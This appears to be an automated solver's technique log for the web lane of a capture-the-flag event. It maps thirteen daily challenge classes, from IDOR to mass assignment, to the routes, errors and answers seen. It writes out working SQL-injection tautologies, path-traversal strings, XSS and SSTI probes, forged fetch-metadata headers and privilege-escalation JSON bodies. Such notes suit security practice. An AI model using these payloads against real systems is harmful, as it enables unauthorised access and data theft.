# web — technique log (lane-days D01-D13 released; updated after every day)

How the lane has looked so far (observations, not guarantees):
- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,
  22 D09-D10, 23 D11-D13 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07
  "Stored for Later" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).
  Expect 2-3 lane-days per calendar day (D14-D31 = 18 left for cal. 24-31). Each lane-day = ONE classic bug, named
  by a title pun: D01 backup exposure "Back Up a Minute", D02 IDOR "Permission to Slip", D03 SQLi "Query Me This",
  D04 path traversal "Stay in Your Directory", D05 missing function-level authz "Administratively Speaking", D06
  reflected XSS "Reflect Upon This", D07 stored XSS "Stored for Later", D08 session fixation "Session Impression",
  D09 CSRF "Forged With Care", D10 unrestricted upload "Uploading Expectations", D11 SSTI "Template Temper", D12
  second-order SQLi "Ask Again Later", D13 mass assignment "Posted Too Much". Arc: info-disclosure -> access control
  -> injection -> file read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi ->
  mass assignment (server-side / API turn since D10; D10-D12 are "injection, one level deeper" sequels).
- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{"id": "Target N",
  "url": "https://<48hex>.2026.huntress.ctf.games/"}]`. Reachable directly from the host, behind Cloudflare. After
  CORRECT every path returns `410 {"state":"completed"}`; an untimed target stops after 30 min idle.
- **Contract is fixed:** `proof-N` "Recover the proof from Target N.", artifact `Target N`, `exact_text`, `trim`.
  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.
- **Since D05 every app is the same kit** ("A small, complete training app with one deliberately isolated security
  boundary"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET
  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:
  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,
  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+
  `upload_policy`+`upload_shape`). D11-D13 had NO concept key (D11 not even `secondary_route`): the prompt + the
  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing
  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,
  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`
  (403)). Success = `{"ok":true,"effect":"<snake_case>","evidence":"proof_..."}`, a concept-shaped JSON carrying the
  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).
- **"Browser" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers
  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.
- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt
  describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition
  not logged: the solver answered all 3 targets in 4-6 s). Mastery targets often sit ~3-5 min in `preparing` (D12
  189 s, D13 175 s; D11 7.5 s); singles / TT 4-10 s.
- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13 TT all came back
  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D11 is the counter-example: the single
  worker wrote the `lib/web/handlers/day23_*.py` plugin BEFORE submitting -> TT correct first try (solve 5.2 s) and
  Mastery 4.4 s. The orchestrator starts TT ~1 min after single CORRECT, before a separate codify worker finishes.

## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)
- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question
  `artifact` "Target N" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.
- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on
  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;
  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).
- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |
  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `staff-<hex8>`; render (D10)
  `account` | `internal` | `result`; D09 `preferences_route` fixed `/preferences`. Seen within one day: D12 secondary
  `result` (single) -> `internal` (TT); D13 `audit` -> `internal`. Rule: pick routes by clue KEY role
  (`feature_route`, `secondary_route`, `*_data_route`, `*_template`), never by the word in the value.
- **Clue key set**: with a concept key (D06-D10) | only `feature_route`+`secondary_route` (D12, D13) | only
  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`
  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink).
- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{"ok":true,"saved":true}` /
  `201 {"ok":true,"profile":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send
  JSON first (form second), every candidate field in one body.
- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>
  .json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.
- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`
  `"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +
  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.
- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.
- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both
  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.
- **Upload (D10)**: route words + skin; "txt + text/plain" policy never enforced. Rule: routes by key, preview URL from
  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.
- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),
  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a "Spring Boot" costume; context var
  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate
  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the
  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).
- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every
  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder
  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.
- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body
  holding `display_name` + `role:"admin"|"administrator"`, `is_admin`, `isAdmin`, `admin`, `roles:["admin"]`,
  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,
  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.
- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board
  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`.

## Recognition cues -> first move
- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;
  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.
- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,
  browser, POST, admin). No concept key -> the prompt's verb names the bug.
- `Disallow:` -> D01 crawl. "Signed in as" + `/<things>/<id>` -> D02 IDOR. Search / "database" -> D03 tautology.
  `?doc=` + "stay inside / mounted at /path" -> D04 traversal. "staff-only door, just a sign" -> D05 GET it.
- "repeats everything", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET
  the callback with same-origin fetch-metadata. "guestbook", "reviewer stops by", `moderator_data_route` -> D07 stored
  script fetch(data)->POST receipt; poll. "plant your session", `session_hint` -> D08 `?sid=<hint>`.
- "obeys whoever asks nicely -- even strangers", form with hidden `csrf_token` -> D09 cross-site form submit.
- "upload form has standards. Low ones", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.
- "template engine ... evaluates everything", "speak in expressions", "incantation", page "Rendered message" with an
  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.
- "plant your question inside the data and come back later", "delayed echo", feature = `post_required`, secondary
  returns `{"rows":[],"effect":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET
  secondary -> `rows` holds the private row.
- "the form only asked for your name. But the API binds whatever you hand it", "hand it a promotion", feature
  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every
  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.
- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows).

## Day by day
- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a
  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain
  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`
  -> `effect: framework_authorization_bypassed`; 47 s.
- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET
  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,
  `Origin`, `X-Callback-Nonce` -> `isolated_browser_callback`; 83 s; TT broke on routing by the word `callback`.
  D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data route with credentials and POSTs
  `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s; Mastery had `/api/postcards`, receipt after 12 s.
  D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET secondary ->
  `fixed_session_privilege_transfer`; 116 s; Mastery ~15 min (every solver raced on every target starved the app).
- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form (`destination` select, hidden
  `csrf_token`); submit `?destination=review-NNNN%40outside.example.invalid` with `Sec-Fetch-Site: cross-site`,
  `Mode: navigate`, `Dest: document`, foreign Referer -> `/api/preferences` `changed_across_sites:true` + `evidence`;
  70 s. D10 upload: POST `{"filename":"note.html","content":"<p>{{objective}}</p>","content_type":"text/html"}` -> GET
  the returned `path` -> proof in HTML; 58 s. Both TT `solver_incomplete` (~41 s generic race); Mastery 3.9-4.9 s.
- **D11 Template Temper (cal. 23)** -- SSTI. Clues `{framework: "Spring Boot", current_role, feature_route:
  /process-<hex6>}`, nothing else. Bare GET -> `<article><h1>Rendered message</h1><pre></pre></article>`. One probe
  per param `a${7*7}b*{7*7}c{{7*7}}d`: only `template` rendered, as `a${7*7}b*{7*7}c49d`. `?template={{objective}}`
  -> proof in `<pre>`; `{{T(java.lang.Runtime)}}` printed a class (SpEL-ish, RCE was never needed). Single CORRECT
  105 s; the worker wrote the plugin handler before submitting -> TT CORRECT first try (15.8 s total, solve 5.2 s),
  Mastery 3 targets 15.4 s.
- **D12 Ask Again Later (cal. 23)** -- second-order SQLi. Clues `{framework: "Sinatra", feature_route: /submit-<hex6>,
  secondary_route: /result-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; any POST (form or JSON,
  even `{}`) -> `{"ok":true,"saved":true}`; GET secondary runs the stored value in a quoted SQL literal ->
  `{"rows":[...],"effect":"delayed_query_revealed_private_row"}`, effect printed even with `rows: []`. Form-encoded
  plants in 25 field names -> `rows: []`; the same `x' OR '1'='1' -- ` as a JSON body (`jq -nc` builds
  `{"name":P,"q":P,...}`, `curl -X POST -H 'Content-Type: application/json' -d "$J"`) -> `rows: ["Ordinary workspace
  note","proof_..."]`; a `"`-quoted variant -> `rows: []`, an `x') OR 1=1 -- ` variant -> 500. TT winner `zz' OR 1=1 --`
  (JSON). `--` comments DID work in both (the handler docstring claiming otherwise is wrong). Single CORRECT 83 s; TT
  `solver_incomplete` 41 s (handler not yet written), live worker hand-solved; Mastery solve 6.4 s (189 s preparing).
- **D13 Posted Too Much (cal. 23)** -- mass assignment. Clues `{framework: "NestJS", feature_route: /inspect-<hex6>,
  secondary_route: /audit-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; GET secondary -> 403
  `administrator_required`. POST JSON `{"display_name":"bob","role":"admin","is_admin":true,"admin":true}` -> `201
  {"ok":true,"profile":{"display_name":"bob"}}` (privileged keys silently bound, not echoed) -> GET secondary ->
  `{"ok":true,"effect":"bound_privileged_property","evidence":"proof_..."}`. Single CORRECT 59 s; TT
  `solver_incomplete` 12.9 s (solve.py was a stub), live worker sent role/isAdmin/is_admin/admin/roles/access_level/
  permissions in one body -> CORRECT; Mastery solve 4.6 s (175 s preparing).

## GM answer conventions learned
- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.
  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.
- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),
  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),
  `bound_privileged_property` (D13, proof in `evidence`). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof
  in rendered HTML; D07 in a moderator receipt.
- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.

## Pitfalls that cost time
- Shipping a new day without its class handler: D09, D10, D12, D13 TT all `solver_incomplete`. Write the
  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.
- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.
- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.
- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.
- A 500 on `{{unknown}}` (D11 Spring JSON) means "undefined variable", not "not injectable"; `{{objective}}` worked.
- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13
  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's
  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`.
- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.
- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.
- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.
- Trusting the app's stated policy ("txt only", "token required"): D09/D10 rules were decorative.
- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.

## reviewer cross-check (measured on a parallel agent; folded into the drivers)
- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and
  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to
  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.
- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.
- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.
